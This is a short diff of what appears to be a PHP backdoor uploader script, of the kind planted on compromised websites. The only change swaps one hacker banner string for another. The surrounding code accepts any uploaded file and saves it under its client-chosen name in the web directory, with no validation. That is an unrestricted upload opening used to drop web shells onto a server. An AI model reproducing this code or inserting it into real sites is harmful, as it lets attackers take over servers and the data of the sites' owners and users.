@@ -15,7 +15,7 @@ echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
 {
 move_uploaded_file($_FILES["file"]["tmp_name"],
 "" . $_FILES["file"]["name"]);
-echo "LUMMAXECH77 --> " . "" . $_FILES["file"]["name"];
+echo "X-PLOITECH --> " . "" . $_FILES["file"]["name"];
 echo"<hr>";
 }
 }
